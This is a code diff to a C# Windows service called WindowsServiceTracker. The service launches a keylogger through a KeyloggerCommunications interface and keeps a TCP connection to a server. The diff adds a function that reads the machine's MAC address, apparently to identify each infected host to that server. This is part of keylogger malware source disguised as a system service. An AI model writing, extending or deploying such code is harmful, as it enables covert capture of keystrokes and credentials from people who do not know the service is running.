@@ -13,6 +13,7 @@ using System.Threading;
 using System.IO;
 using KeyloggerCommunications;
 using System.ServiceModel;
+using System.Net.NetworkInformation;
 
 namespace WindowsServiceTracker
 {
@@ -42,6 +43,7 @@ namespace WindowsServiceTracker
         private KeyloggerCommInterface pipeProxy;
         private Thread tcpThread;
         private volatile bool tcpKeepAlive = true;
+        private String macAddress;
 
         //private Keylogger keylog = new Keylogger();
 
@@ -71,6 +73,8 @@ namespace WindowsServiceTracker
 
             StartKeylogger(); //todo remove after debugging
             Thread.Sleep(30000);
+
+            macAddress = getMacAddress();
 
             tcpThread = new Thread(this.MaintainServerConnection);
             tcpThread.Start();
@@ -114,6 +118,29 @@ namespace WindowsServiceTracker
         {
             //Write to the Windows Event Logs, shows up under Windows Logs --> Application
             EventLog.WriteEntry(ERROR_LOG_SOURCE, eventLogInput, EventLogEntryType.Information);
+        }
+
+        private String getMacAddress()
+        {
+            string mac = String.Empty;
+
+            foreach (NetworkInterface nic in NetworkInterface.GetAllNetworkInterfaces())
+            {
+                if (nic.NetworkInterfaceType == NetworkInterfaceType.Ethernet)
+                {
+                    return nic.GetPhysicalAddress().ToString();
+                }
+                else if (mac == String.Empty && nic.NetworkInterfaceType == NetworkInterfaceType.Wireless80211)
+                {
+                    mac = nic.GetPhysicalAddress().ToString();
+                }
+                else if (mac == String.Empty && nic.OperationalStatus == OperationalStatus.Up)
+                {
+                    mac = nic.GetPhysicalAddress().ToString();
+                }
+            }
+
+            return mac;
         }
 
         //make a thread based on this method to connect to the server and read/write to the tcp connection
